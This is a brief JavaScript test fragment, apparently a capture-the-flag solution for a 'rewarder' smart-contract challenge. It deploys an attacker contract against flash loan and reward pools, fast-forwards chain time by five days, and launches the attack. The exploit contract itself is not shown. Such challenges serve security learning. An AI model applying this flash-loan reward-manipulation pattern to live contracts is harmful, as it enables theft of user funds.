...
describe("[Challenge] The rewarder", function () {
  ...
  it("Execution", async function () {
    ...
    let attacker = await (
      await ethers.getContractFactory("TheRewarderAttacker", player)
    ).deploy(flashLoanPool.address, rewarderPool.address, rewardToken.address, liquidityToken.address);

    await ethers.provider
      .send("evm_increaseTime", [5 * 24 * 60 * 60])
      .then(async () => await attacker.connect(player).startAttack());
  });
